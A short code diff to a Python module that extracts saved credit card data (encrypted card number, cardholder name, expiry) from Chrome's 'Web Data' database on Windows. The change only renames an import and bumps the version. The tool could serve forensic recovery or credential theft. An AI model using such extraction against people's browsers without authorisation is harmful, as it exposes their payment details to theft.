@@ -9,7 +9,7 @@ except ImportError:
 
 from modules.windows.chrome.chrome_module import ChromeModule
 from internal import data_type
-from api.windows import passwords
+from api.windows import format
 
 
 class WindowsChromeSavedData(ChromeModule):
@@ -17,7 +17,7 @@ class WindowsChromeSavedData(ChromeModule):
 		ChromeModule.__init__(
 			self,
 			name='WindowsChromeSavedData',
-			version='0.1.0',
+			version='0.1.1',
 			file=__file__,
 			dependencies=['os', 'sqlite3', 'win32crypt'],
 		)
@@ -77,7 +77,7 @@ class WindowsChromeSavedData(ChromeModule):
 			self.cursor_getV2(
 				path=profile + '/Web Data',
 				items=[
-					[data_type.CreditCard, ('card_number_encrypted', 'name_on_card', 'expiration_month', 'expiration_year'), passwords, [0]],
+					[data_type.CreditCard, ('card_number_encrypted', 'name_on_card', 'expiration_month', 'expiration_year'), format, [0]],
 				],
 				db='credit_cards',
 				spe='credit_cards.' + os.path.split(profile)[1],
